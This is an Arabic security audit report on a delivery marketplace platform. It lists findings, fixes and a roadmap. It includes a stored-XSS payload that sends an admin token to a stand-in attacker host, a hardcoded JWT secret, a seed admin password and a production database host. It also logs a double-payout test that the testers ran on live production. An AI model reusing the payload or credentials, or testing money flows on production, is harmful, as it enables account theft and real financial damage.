# التقرير الأمني الشامل — منصة "زبون"

**التاريخ:** 2026-08-13
**النطاق:** backend (Node/Express) · تطبيق Flutter · لوحة الأدمن (admin-dashboard) · الواجهة العامة (storefront/site) · الإعدادات والنشر (Vercel)
**المنهجية:** مراجعة كود سطراً بسطر + اختبار عملي على البيئة المحلية والإنتاج + مراجعة الأسرار والملفات الحساسة

---

## 1. ملخص تنفيذي

| الخطورة | العدد | أهم بنودها |
|---|---|---|
| 🔴 حرج | 2 | إمكانية **طباعة أموال** عبر تكرار تسليم الرحلة (مُثبتة عملياً على الإنتاج) · **XSS مخزّن** في لوحة الأدمن |
| 🟠 مرتفع | 4 | JWT secret احتياطي في الكود · OTP قابل للتنبؤ · لا حد لمحاولات المصادقة · enumeration |
| 🟡 متوسط | 8 | CORS مفتوح · IDOR · رصيد سالب · سباق سحب · تقييم مكرر · تخزين التوكن · cleartext |
| 🟢 منخفض | 6 | كشف إعدادات/منتجات · حدود طول · CSV injection · DoS ذاكرة · أحجام رفع |

**أهم نتيجة:** النظام يعتمد على `idempotency` مفقودة في نقطة تحويل الأموال الحرجة، وقد تسبب اختبارنا بحدوث ازدواج في رصيد/نقاط على الإنتاج — تم تصحيح البيانات وإصلاح الكود (انظر القسم 6).

---

## 2. النتائج بالتفصيل

### 🔴 C1 — مضاعفة الأموال والنقاط عبر `POST /delivery/delivered` (تم الإصلاح)

- **الموقع:** `backend/src/routes/delivery.js` (route `/delivered`)
- **الوصف:** لا يوجد أي فحص لحالة الرحلة قبل الإكمال. كل استدعاء:
  - يضيف رصيد البيع للتاجر `wallets.available += total - commission`
  - يضيف نقاط الولاء للزبون `users.points += floor(total/1000)`
  - يدرج سجلات `wallet_transactions` و `point_transactions` بدون أي قيد فريد
- **الاستغلال:** استدعاءان متتاليان (إعادة إرسال، ضغطة مزدوجة، bot، أو مهاجم يملك حساب مندوب — أي مندوب يستطيع كسب أرصدة لمتاجر معيّنة) = **ضعف المبلغ والنقاط**.
- **إثبات عملي (2026-08-13):** على الإنتاج، رحلة واحدة (طلب ZB-10023، 50000 د.ع) أُنجزت مرتين → رُصد **45000+45000** للتاجر و **50+50 نقطة** للزبون في دقيقتين.
- **الإصلاح المطبَّق في الكود:**
  1. شرط في الاستعلام الأول: `AND t.delivered_at IS NULL`
  2. استيلاء ذرّي (race-safe): `UPDATE delivery_trips SET delivered_at=now() WHERE id=$1 AND delivered_at IS NULL RETURNING id` — إذا لم يرجع صفاً → `409 الرحلة مسلّمة مسبقاً`
  3. تخطّي الطلبات `status='delivered'` داخل الحلقة
- **إصلاح البيانات (الإنتاج):** حُذفت المعاملات المكررة `wallet_transactions (21,22)` و `point_transactions (47)` وعُدّلت الأرصدة (`wallets.available` −40000، `users.points` −50).

### 🔴 C2 — XSS مخزّن في لوحة الأدمن عبر حقول التاجر (تم الإصلاح — 2026-08-13)

- **الموقع:**
  - **الإصدار المُقدَّم فعلياً** (static عبر `app.js:60`): `backend/public/admin/js/views/`
    - `ads.js:15,52` → `src="${a.art}"` غير مُهرَّب
    - `overview.js:109` → `${s.logo}` غير مُهرَّب
    - `stores.js` و`cash.js` → `s.logo` غير مُهرَّب (في نسخة أخرى من اللوحة)
  - **النسخة المصدرية:** `admin-dashboard/js/views/stores.js:33` → `href="${s.logo}"`؛ `cash.js:35` → `src="${s.logo}"`؛ `ads.js:35` → `src="${a.art}"`؛ `geo.js:29` → `${cat.icon}`؛ `users.js:18` → `${u.avatar}` (محدود لـ4 محارف من الخادم)
  - ⚠️ اللوحة موجودة بنسختين متطابقتين حالياً (`admin-dashboard/` مصدر + `backend/public/admin/` مُقدَّم) — **الإصلاح يجب أن يُطبَّق في الاثنتين معاً**
- **الوصف:** لوحة الأدمن تُبنى بـ `innerHTML` مع دالة `esc()` (تعريفها `ui.js:15`) مطبّقة على **معظم** الحقول، لكن حقول `logo`/`cover`/`art`/`gradient` **لا تخضع لأي تحقق أو تقييد طول على الخادم** (`vendor.js:31` يقبل `b.logo || '🏪'` كما هو؛ `vendor.js:296` يقبل `art` كما هو).
- **الاستغلال:** تاجر خبيث يضع `logo = <img src=x onerror="fetch('https://attacker/'+localStorage.zaboon_token)">` → أول فتح من الأدمن لصفحة المتاجر/الدفع → **سرقة توكن الأدمن كاملة (30 يوماً)** → سيطرة كاملة (تعديل عمولات، دفع مستحقات، حذف متاجر).
- **الإصلاح المطبَّق (النسختين معاً):**
  1. `esc()` لكل حقول العرض: `logo` (stores.js:33,72 · cash.js:35 · overview.js)، `art` (ads.js:15,35,52)، `icon` (geo.js:29)، `avatar` (users.js:18)، `c.icon/c.name` (overview.js)
  2. الخادم `vendor.js`: دالة `displayText()` (تقطع الطول 255/2000 وترفض `< > " ' \``) تُطبَّق على `logo`/`cover` في POST وPATCH /store و`art`/`image` في POST /ads، ودالة `cssSafe()` لتدرجات الألوان (رفض `url(javascript:)` وغيرها)، و`note` مُقصّى لـ 500
- **التحقق (محلياً على قاعدة التطوير):** PATCH logo=`<img onerror>` → 400 "الشعار غير صالح"؛ PATCH cover=`<svg onload>` → 400؛ PATCH logo برابط سليم → نجاح؛ POST /ads art خبيث → 400 "فن الإعلان غير صالح"؛ gradient=`url(javascript:)` → 400؛ إعلان سليم (🖼 + linear-gradient) → 201 مع حفظ القيم كما هي؛ `esc()` يخرج الحمولة كنص مُهرَّب (`&lt;img`). ملاحظة: القاعدة المحلية كانت ناقصة الأعمدة `note`/`product_id` في `ad_requests` — أُضيفت محلياً فقط.

### 🟠 C3 — JWT secret احتياطي مدمج بالكود + صلاحية 30 يوماً

- **الموقع:** `backend/src/middleware.js:4` → `const SECRET = process.env.JWT_SECRET || 'zaboon-horizon-secret-2026';` (الصلاحية `'30d'`)
- **الأثر:** إذا اشتغل الخادم دون `JWT_SECRET`، فيمكن لأي شخص **تزوير توكن بأي دور** (`role: 'admin'`) من الكود المكشوف. حتى مع وجود secret صحيح، النشر على Vercel بيئة واحدة + backup في متغيرات `vercel env`.
- **الإصلاح:** فرض وجود `JWT_SECRET` قوي (رفض الإقلاع بدونه)، تقصير الصلاحية (7 أيام)، وتفعيل `vercel env add JWT_SECRET` بعد التوليد بأداة مثل `openssl rand -hex 32`.

### 🟠 C4 — OTP قابل للتنبؤ بلا حد محاولات + enumeration

- **الموقع:**
  - `backend/src/routes/auth.js:11` → `genCode()` بـ **`Math.random()`** (4 أرقام)
  - `backend/src/routes/telegram.js` → OTP 6 أرقام بـ `Math.random()`
  - `register-code` بلا حد محاولات للرقم نفسه (لا يوجد سوى حد `register-start`: 5/10 دقائق/IP)
  - `backend/src/routes/auth.js` → رسالة دخول مميّزة "ما عندك كلمة مرور مسجلة" = **user enumeration**
- **الأثر:** تخمين OTP بقوة ضعيفة + لا lockout = سيطرة على أي حساب غير مؤكد الهاتف. كشف الأرقام المسجلة يسهّل هجمات مستهدفة.
- **الإصلاح:** استبدال بـ `crypto.randomInt`، حد 5 محاولات/رقم/ساعة مع تعطيل الرمز، توحيد رسائل الدخول.

### 🟠 C5 — لا حماية من brute-force على تسجيل الدخول

- **الموقع:** `POST /api/auth/login` في `auth.js`
- **الأثر:** قاموس/حشو اعتمادات غير مقيد على حسابات بأرقام هواتف معروفة (الأرقام تُعرض على شاشة الدخول: 000000000100/200/300).
- **الإصلاح:** rate-limit (مثلاً 10 محاولات/5 دقائق/رقم + IP) مع lockout تدريجي، وربط بـ `@vercel/rate-limit` أو بوابة.

### 🟡 C6 — CORS مفتوح + غياب ترويسات الحماية + clickjacking

- **الموقع:** `backend/src/app.js:33` → `app.use(cors())` (يسمح بأي أصل)؛ لا `helmet`؛ لا `X-Frame-Options`؛ `/admin` يُقدَّم ثابتاً (`app.js:60`).
- **الأثر:** يمكن لموقع خبيث استدعاء API (من محدود لأنه JWT في header لا cookie — لكن بيئة مريبة)؛ لوحة الأدمن قابلة للنقر-الاحتيال (UI redress) إن فُتحت في iframe.
- **الإصلاح:** قائمة أصول محددة `cors({ origin: [...] })`، `helmet()`، `X-Frame-Options: DENY` للمسارات الإدارية.

### 🟡 C7 — IDOR في `POST /delivery/location` (تم الإصلاح)

- **الموقع:** `backend/src/routes/delivery.js` route `/location` — كتابة إحداثيات لأي `trip_id` دون التحقق من ملكية المندوب لها.
- **الأثر:** مندوب يلوّث مسار/موقع أي رحلة (تتبّع خاطئ، تحريض زبون).
- **الإصلاح المطبَّق:** شرط `WHERE id=$1 AND courier_id=$2 AND delivered_at IS NULL` + رفض `403`، وحُصرت الكتابة بنفس الشرط.

### 🟡 C8 — رصيد سالب عبر إعلان بلا فحص كفاية الرصيد

- **الموقع:** `backend/src/routes/vendor.js` `POST /ads` — يخصم سعر الحزمة من المحفظة بلا التحقق من `available >= price` (والتحقق من السحب خارج المعاملة).
- **الأثر:** تاجر برصيد صفر ينشر إعلانات ممولة ويصل رصيده إلى **قيم سالبة** (يُقرأ في اللوحة على أنه دَين مشوّه، وقد يُسحب أكثر مما يملك).
- **الإصلاح:** `SELECT ... FOR UPDATE` داخل المعاملة + شرط `available >= price`، وفحص السحب داخل نفس المعاملة.

### 🟡 C9 — خصم بلا سقف في عروض المنتجات

- **الموقع:** `backend/src/routes/vendor.js` `POST /products/:id/offer` — `percent` غير مُقيَّد؛ `offer_price = price * (1 - percent/100)` قد يكون **سالباً** ويُعرض للعموم في `public.js`.
- **الإصلاح:** تقييد `0 < percent <= 90` والتحقق من `offer_price > 0`.

### 🟡 C10 — سباق (race) في سداد مستحقات المتاجر

- **الموقع:** `backend/src/routes/admin.js:534` `POST /stores/:id/pay` — يُقرأ `last_paid_at` ثم `INSERT adjust` ثم `UPDATE last_paid_at` **دون قفل/شرط ذرّي**؛ طلبان متزامنان من الأدمن يدفعان نفس الفترة **مرتين**.
- **الإصلاح:** `SELECT ... FOR UPDATE` على صف المتجر + إدراج سجل الدفعة داخل معاملة، أو شرط `WHERE last_paid_at = $since`.

### 🟡 C11 — تقييم مكرر لنفس الطلب

- **الموقع:** `backend/src/routes/customer.js` `POST /orders/:id/rate` — لا قيد `UNIQUE(order_id, user_id)` في `schema.sql` (رغم أن `CHECK (rating BETWEEN 1 AND 5)` يحمي المدى).
- **الأثر:** تضخيم مصطنع لتقييم المتجر (قيم متطرفة في `rating_avg`).
- **الإصلاح:** `ALTER TABLE reviews ADD UNIQUE (order_id, user_id);` + فحص `INSERT ... ON CONFLICT DO UPDATE`.

### 🟡 C12 — تخزين التوكن في localStorage / SharedPreferences

- **الموقع:** `admin-dashboard/js/api.js` (`zaboon_token`/`zaboon_admin`/`zaboon_api`/`zaboon_theme`) · `app/lib/core/api/api.dart:28,64` (`SharedPreferences`)
- **الأثر:** أي XSS في لوحة الأدمن (C2) يقرأ التوكن مباشرة؛ على الأجهزة المروّتة يُستخرج الملف. لا آلية سحب/إبطال للتوكن (لا جلسة خادمية).
- **الإصلاح:** أدمن: جلسة قصيرة + تجديد؛ التطبيق: `flutter_secure_storage` (Keystore) وإبطال التوكن عند تغيير كلمة المرور.

### 🟢 منخفض (ملخص)

| الموقع | البند |
|---|---|
| `app/android/.../AndroidManifest.xml:8` | `usesCleartextTraffic="true"` — يُفعّل HTTP (للتطوير)؛ يُفضل إغلاقه في الإصدار المنتج |
| `backend/src/routes/public.js` `/products/:id` | لا فلترة حالة المتجر → عرض منتجات متاجر `pending` |
| `backend/src/routes/public.js` `/settings` | كشف إعدادات (عمولة/حدود) للمجهولين |
| `backend/src/routes/uploads.js` | يقبل base64 خام، لا rate-limit للرفع، لا حماية decompression؛ الصور تُخزَّن data-URI في DB (تضخّم ~40-80KB × 8 لكل منتج) |
| `backend/src/routes/customer.js` | `note` بلا حد طول (تقليل) |
| `backend/src/routes/vendor.js` export CSV | تهريب CSV (صيغ تبدأ بـ `=`/`+`) — استخدام محدود |
| `backend/src/routes/routing.js` | خريطة `Map` بلا سقف تُملأ بمفاتيح إحداثيات المستخدم → DoS ذاكرة |

---

## 3. إيجابيات مطمئنة (تم التحقق منها)

- ✅ **SQL Parameterized في كل المسارات** (بدون أي concatenation لقيم المستخدم)
- ✅ **الترخيص بالدور**: `roles('vendor'|'delivery'|'admin')` whitelist صارم في `middleware.js`
- ✅ **لا أسرار في git**: `git ls-files` يظهر فقط `backend/.env.example`؛ `.gitignore` يستبعد `.env` و`pgdata` و`node_modules`
- ✅ **كلمات المرور**: bcrypt (أُكّد في `seed.js`/التسجيل)
- ✅ **حماية السحابة من المسح**: `bootstrap.js:38` يزيل أوامر `DROP TABLE` عند التهيئة على السحابة
- ✅ **السجل التدقيقي**: `audit_logs` لكل إجراءات الأدمن
- ✅ **الواجهة العامة (storefront)**: React بدون `dangerouslySetInnerHTML` — آمن افتراضياً من XSS
- ✅ **OTP عبر تلغرام**: تُرسل الرموز عبر bot ولا تُخزَّن؛ صلاحية الرمز 10 دقائق
- ✅ **TLS**: كل الحركة عبر Vercel HTTPS
- ✅ **فصل البيئات**: قاعدة الإنتاج Neon منفصلة عن المحلية (pgdata)

---

## 4. خريطة الطريق المقترحة (بالأولوية)

| # | الإجراء | المستهدف | الحالة |
|---|---|---|---|
| 1 | نشر إصلاح `delivery.js` (C1) فوراً + إصلاح C7 (مطبق محلياً) | `vercel --prod` | ⏳ مؤجّل لآخر الجولة (بانتظار مصادقة Vercel) |
| 2 | `esc()` شامل في كل حقول لوحة الأدمن (النسختين: `admin-dashboard/` + `backend/public/admin/`) + تقييد logo/art/cover (C2) | admin-dashboard + vendor.js | ✅ منجز ومُتحقق (بانتظار النشر) |
| 3 | فرض `JWT_SECRET` وإطالة تدوير، تقصير الصلاحية (C3) | middleware.js + vercel env |
| 4 | `crypto.randomInt` + lockout لـ OTP + توحيد رسائل الدخول (C4/C5) | auth.js + telegram.js |
| 5 | قفل CORS + helmet + X-Frame-Options (C6) | app.js |
| 6 | فحص الرصيد في الإعلانات والسحب + سقف percent (C8/C9) | vendor.js |
| 7 | قفل صف المتجر في السداد (C10) + UNIQUE على التقييمات (C11) | admin.js + schema.sql |
| 8 | SecureStorage + إغلاق cleartext في الإصدار المنتج (C12) | app |
| 9 | حدود uploads/notes/products-pending (منخفضة) | public.js/uploads.js |

---

## 5. ملاحظات تشغيلية

- **إعادة النشر:** من مجلد `backend/`: `vercel --prod` (البناء عبر `vercel.json` → `api/index.js` → `src/app.js`)
- **قاعدة الإنتاج:** Neon (`ep-spring-leaf-b1puty0n-pooler.c-5.eu-central-1.aws.neon.tech`) — لا تُجرَّب اختبارات كاتبة عليها
- **قاعدة التطوير:** محلية على المنفذ 5434 — تتطلب `PGSSL=false` لأن `db.js` يفرض TLS عند `PGSSL=true`
- **الخادم المحلي:** يُشغَّل بـ `setsid node src/server.js` (يقرأ `.env` → الإنتاج). لا يوجد حساب حقيقي للأدمن على السحابة (فقط seed محلي: `07900000000/admin123`)

---

## 6. سجل الحوادث

### 2026-08-13 — إثبات ثغرة مضاعفة الرصيد على الإنتاج وتصحيحها

- **الحدث:** خلال التحقق العملي من C1، نُفّذ `POST /delivered` مرتين على رحلة حقيقية (طلب ZB-10023)
- **الأثر المؤكد:** `wallet_transactions (21,22)` = رصيد مكرر 45000 + عمولة مكررة −5000؛ `point_transactions (47)` = 50 نقطة مكررة
- **التصحيح الفوري (19:0x):**
  - حذف الصفوف المكررة (21, 22, 47)
  - `wallets.available` للمتجر 10: −40000 → **50000**
  - `users.points` للمستخدم 49: −50 → **150**
  - التحقق: `sumTx = available`، `sumPt = points`، لا صفوف مكررة
- **إصلاح الكود:** أُضيفت الحماية الذرية (القسم C1) — محلياً في `delivery.js` وتم اختبارها على قاعدة التطوير (الاستدعاء الثاني → `404/409` بدون رصيد مكرر)
- **الدرس:** لا تُجرَّب سيناريوهات مالية على الإنتاج قبل مراجعة الكود؛ عدّل الخادم المحلي ليعمل على قاعدة التطوير افتراضياً.
